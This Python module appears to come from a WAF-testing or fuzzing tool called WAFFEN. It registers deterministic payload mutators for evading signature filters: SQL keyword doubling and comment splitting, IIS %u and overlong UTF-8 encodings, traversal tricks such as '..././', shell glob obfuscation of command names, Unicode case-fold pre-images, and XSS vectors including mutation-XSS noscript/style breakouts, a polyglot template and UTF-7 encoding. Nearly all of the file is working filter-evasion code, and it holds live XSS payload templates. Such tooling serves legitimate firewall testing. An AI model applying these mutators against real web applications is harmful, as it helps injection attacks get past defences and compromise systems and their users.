"""Phase B "quick-win" signature-evasion cluster (see docs/ROADMAP.md Phase B /
docs/COMPETITIVE_RESEARCH.md section B).

These mutators target techniques WAFFEN was missing relative to the SQLMap
tamper catalog and the PortSwigger/PayloadsAllTheThings evasion corpus:
keyword self-doubling, IIS %u unicode, intra-keyword comments, comment-style
whitespace, identifier splitting, mutation-XSS vectors + polyglots,
semicolon-less HTML entities, unicode case-folding pre-images, command glob
obfuscation, self-referential traversal segments, extra-overlong path
encoding, and UTF-7 XSS.

All transforms are pure str -> str and deterministic (no unseeded randomness).
"""
from __future__ import annotations

import re

from .base import REGISTRY

_SQL = {"SQL Injection", "NoSQL Injection"}
_XSS = {"XSS Injection"}
_CMD = {"Command Injection"}
_TRAV = {"Directory Traversal", "File Inclusion"}
_SQL_XSS_PATH = {"SQL Injection", "XSS Injection", "Directory Traversal", "File Inclusion"}

_SQL_KEYWORDS = (
    "SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "DROP", "WHERE", "FROM",
    "AND", "OR", "TABLE", "DATABASE", "ORDER", "GROUP", "HAVING", "LIKE",
    "LIMIT", "BETWEEN", "CASE", "WHEN", "THEN", "NULL", "INTO", "VALUES",
)
_SQL_KEYWORD_RE = re.compile(r"\b(" + "|".join(_SQL_KEYWORDS) + r")\b", re.IGNORECASE)

# Broader keyword bank used by the case-folding pre-image mutator (any class).
_FOLD_KEYWORDS = _SQL_KEYWORDS + ("SCRIPT", "ALERT", "ONERROR", "ONLOAD", "IFRAME")
_FOLD_KEYWORD_RE = re.compile(
    r"\b(" + "|".join(sorted(set(_FOLD_KEYWORDS), key=len, reverse=True)) + r")\b",
    re.IGNORECASE,
)


# ---------------------------------------------------------------------------
# 1. keyword self-doubling: SELECT -> SELSELECTECT (survives a single-pass
#    naive strip of the keyword, which re-assembles the original keyword).
# ---------------------------------------------------------------------------
def keyword_doubling(s: str) -> str:
    def dbl(m: re.Match) -> str:
        kw = m.group(0)
        mid = len(kw) // 2
        return kw[:mid] + kw + kw[mid:]
    return _SQL_KEYWORD_RE.sub(dbl, s)


# ---------------------------------------------------------------------------
# 2. IIS-style %uXXXX unicode encoding of every character.
# ---------------------------------------------------------------------------
def percent_u_unicode(s: str) -> str:
    return "".join(f"%u{ord(c):04x}" for c in s)


# ---------------------------------------------------------------------------
# 3. intra-keyword comments: insert /**/ *inside* the keyword letters
#    (not just around it) — SELECT -> S/**/E/**/LECT.
# ---------------------------------------------------------------------------
def intra_keyword_comment(s: str) -> str:
    def split_kw(m: re.Match) -> str:
        kw = m.group(0)
        if len(kw) <= 1:
            return kw
        if len(kw) == 2:
            return kw[0] + "/**/" + kw[1]
        return kw[0] + "/**/" + kw[1] + "/**/" + kw[2:]
    return _SQL_KEYWORD_RE.sub(split_kw, s)


# ---------------------------------------------------------------------------
# 4/5. space2dash / space2hash — space -> inline-comment-terminated line
#    comment with a deterministic pseudo-random tail.
# ---------------------------------------------------------------------------
def _space_to_line_comment(s: str, marker: str, seed: int) -> str:
    # Deterministic per-call: a fresh counter-based sequence, not shared RNG
    # state, so repeated calls on the same input always produce the same
    # output regardless of call order elsewhere in the process.
    out = []
    counter = seed
    for ch in s:
        if ch == " ":
            counter = (counter * 1103515245 + 12345) & 0x7FFF
            out.append(f"{marker}{1000 + (counter % 9000)}\n")
        else:
            out.append(ch)
    return "".join(out)


def space_to_dash_comment(s: str) -> str:
    return _space_to_line_comment(s, "--", 0xDA58)


def space_to_hash_comment(s: str) -> str:
    return _space_to_line_comment(s, "#", 0x4A58)


# ---------------------------------------------------------------------------
# 6. information_schema identifier split — breaks a literal signature match
#    on the "information_schema" token while the DB still resolves the
#    comment-split identifier.
# ---------------------------------------------------------------------------
_INFO_SCHEMA_RE = re.compile(r"information_schema", re.IGNORECASE)


def information_schema_split(s: str) -> str:
    def split(m: re.Match) -> str:
        word = m.group(0)
        return word[:4] + "/**/" + word[4:]
    return _INFO_SCHEMA_RE.sub(split, s)


# ---------------------------------------------------------------------------
# 7. mutation-XSS (mXSS) vectors — rely on the browser's HTML parser
#    re-interpreting already-parsed content in a different content model
#    (e.g. innerHTML round-trip inside <noscript>/<xmp>).
# ---------------------------------------------------------------------------
def _extract_js_body(s: str) -> str:
    body = re.sub(r"</?script[^>]*>", "", s, flags=re.IGNORECASE)
    body = re.sub(r"<[^>]+>", "", body).strip()
    return body or "alert(1)"


def mxss_noscript(s: str) -> str:
    """<noscript> innerHTML round-trip vector: a title attribute that closes
    </noscript> early once re-parsed as HTML (classic mXSS, e.g. CVE-class
    issues in rich-text sanitizers using innerHTML for noscript content)."""
    body = _extract_js_body(s)
    return f'<noscript><p title="</noscript><img src=x onerror={body}>"></p></noscript>'


def mxss_xmp_style(s: str) -> str:
    """<xmp>/<style> RAWTEXT content-model vector: a '</style>' breakout
    inside an element whose raw-text content model is mis-handled on
    innerHTML re-parse."""
    body = _extract_js_body(s)
    return f'<style><img title="</style><img src=x onerror={body}>"></style>'


# ---------------------------------------------------------------------------
# 8. XSS polyglot — a known context-spanning payload template (valid inside
#    HTML text, attribute value, script, and a handful of tag contexts at
#    once) carrying the original alert body.
# ---------------------------------------------------------------------------
_POLYGLOT_TEMPLATE = (
    "jaVasCript:/*-/*`/*\\`/*'/*\"/*--></noscript></title></textarea></style>"
    "</template></noembed></script><html \\\" onmouseover=/*&lt;svg/*/onload={body}//>"
)


def xss_polyglot(s: str) -> str:
    body = _extract_js_body(s)
    return _POLYGLOT_TEMPLATE.format(body=body)


# ---------------------------------------------------------------------------
# 9. HTML entities without the trailing ';' — browsers still decode these per
#    the HTML5 parsing spec's legacy-entity table, but naive '&...;' regex
#    signatures miss them.
# ---------------------------------------------------------------------------
def html_entity_no_semicolon(s: str) -> str:
    return s.replace("&", "&amp").replace("<", "&#60").replace(">", "&#62")


# ---------------------------------------------------------------------------
# 10. Unicode case-folding pre-images — letters inside flagged keywords
#     substituted with unicode code points that fold to the same letter
#     under naive .lower()/.upper() blacklist checks but render/byte-compare
#     differently: ſ (U+017F) -> s, K (U+212A KELVIN SIGN) -> k,
#     İ (U+0130) -> i.
# ---------------------------------------------------------------------------
_FOLD_MAP = {
    "s": "ſ", "S": "ſ",
    "k": "K", "K": "K",
    "i": "İ", "I": "İ",
}


def case_fold_preimage(s: str) -> str:
    def fold(m: re.Match) -> str:
        word = m.group(0)
        return "".join(_FOLD_MAP.get(c, c) for c in word)
    return _FOLD_KEYWORD_RE.sub(fold, s)


# ---------------------------------------------------------------------------
# 11. Command wildcard glob — shell glob-expands at execution time, so
#     filters matching literal binary/path names never see them:
#     cat -> c?t, /bin/cat -> /b?n/c?t.
# ---------------------------------------------------------------------------
def _glob_word(m: re.Match) -> str:
    w = m.group(0)
    if len(w) <= 2:
        return "?" * len(w)
    return w[0] + "?" * (len(w) - 2) + w[-1]


def cmd_wildcard_glob(s: str) -> str:
    return re.sub(r"[a-zA-Z]+", _glob_word, s)


# ---------------------------------------------------------------------------
# 12. Self-referential traversal segments — a redundant './' no-op token
#     folded into the sequence so that a single non-recursive '../' strip
#     still leaves a usable '../' behind.
# ---------------------------------------------------------------------------
def traversal_self_referential(s: str) -> str:
    return s.replace("../", "..././")


# ---------------------------------------------------------------------------
# Bonus Phase-B quick-win items (extra-overlong path encoding, UTF-7 XSS).
# ---------------------------------------------------------------------------
def traversal_overlong_3byte_slash(s: str) -> str:
    """'/' -> %e0%80%af, a 3-byte overlong UTF-8 encoding of '/' accepted by
    some legacy decoders that only reject the 2-byte overlong form."""
    return s.replace("/", "%e0%80%af")


def xss_utf7_encode(s: str) -> str:
    """Rebuild '<'/'>' using UTF-7 modified-base64 shifted sequences
    (+ADw-/+AD4-) — bypasses literal '<'/'>' signatures on pages served
    without an explicit charset where legacy browsers auto-detected UTF-7."""
    return s.replace("<", "+ADw-").replace(">", "+AD4-")


def _register() -> None:
    R = REGISTRY
    R.add("sql_keyword_doubling", keyword_doubling, "obfuscator",
          "self-doubled keyword (SELECT -> SELSELECTECT) survives one-pass strip",
          classes=_SQL)
    R.add("percent_u_unicode", percent_u_unicode, "encoder",
          "IIS-style %uXXXX unicode-encode every character",
          classes=_SQL_XSS_PATH)
    R.add("sql_intra_keyword_comment", intra_keyword_comment, "obfuscator",
          "/**/ inserted inside keyword letters (SELECT -> S/**/E/**/LECT)",
          classes=_SQL)
    R.add("sql_space_to_dash_comment", space_to_dash_comment, "obfuscator",
          "space -> '--<n>\\n' line-comment whitespace",
          classes=_SQL)
    R.add("sql_space_to_hash_comment", space_to_hash_comment, "obfuscator",
          "space -> '#<n>\\n' line-comment whitespace",
          classes=_SQL)
    R.add("sql_information_schema_split", information_schema_split, "obfuscator",
          "split 'information_schema' identifier with /**/",
          classes=_SQL)
    R.add("xss_mxss_noscript", mxss_noscript, "obfuscator",
          "mutation-XSS: <noscript><p title=...> innerHTML round-trip breakout",
          classes=_XSS)
    R.add("xss_mxss_xmp_style", mxss_xmp_style, "obfuscator",
          "mutation-XSS: <style> RAWTEXT content-model breakout",
          classes=_XSS)
    R.add("xss_polyglot", xss_polyglot, "obfuscator",
          "rebuild as a known context-spanning HTML/JS/attr polyglot payload",
          classes=_XSS)
    R.add("xss_entity_no_semicolon", html_entity_no_semicolon, "encoder",
          "entity-encode without trailing ';' (&#60 / &#62 / &amp)",
          classes=_XSS)
    R.add("case_fold_preimage", case_fold_preimage, "obfuscator",
          "keyword letters -> unicode case-fold pre-images (ſ/K/İ)")
    R.add("cmd_wildcard_glob", cmd_wildcard_glob, "obfuscator",
          "binary/path names -> shell glob wildcards (cat -> c?t)",
          classes=_CMD)
    R.add("trav_self_referential", traversal_self_referential, "obfuscator",
          "'../' -> '..././' self-referential, collapses to '../' after one strip",
          classes=_TRAV)
    R.add("trav_overlong_3byte_slash", traversal_overlong_3byte_slash, "encoder",
          "'/' -> %e0%80%af 3-byte overlong UTF-8 slash",
          classes=_TRAV)
    R.add("xss_utf7_encode", xss_utf7_encode, "encoder",
          "'<'/'>' -> UTF-7 shifted sequences (+ADw-/+AD4-)",
          classes=_XSS)


_register()
